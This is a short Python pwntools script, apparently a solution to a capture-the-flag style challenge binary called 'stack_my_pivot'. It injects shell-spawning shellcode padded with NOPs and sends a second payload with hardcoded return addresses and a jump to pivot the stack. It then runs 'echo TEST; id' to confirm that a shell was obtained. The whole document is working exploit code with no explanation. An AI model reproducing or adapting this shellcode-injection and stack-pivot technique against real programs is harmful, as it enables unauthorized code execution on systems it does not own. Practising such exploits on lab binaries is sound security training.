#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./stack_my_pivot')

shellcode = asm(shellcraft.sh())
first_input = b'\x90' * 20 + shellcode
first_input = first_input[:50].ljust(50, b'\x90')
p.send(first_input)

second_input = b'\x90' * 8 + p64(0x400738) + b'\xeb\xae' + b'\x90' * 6 + p32(0x40072e)
p.send(second_input)

time.sleep(1)
try:
    p.sendline(b'echo TEST; id')
    result = p.recvall(timeout=2)
    if b'TEST' in result or b'uid=' in result:
        print("SUCCESS! Got shell!")
        print(result.decode())
    else:
        print("No shell, got:", result)
except:
    print("Failed to get shell")

p.close()
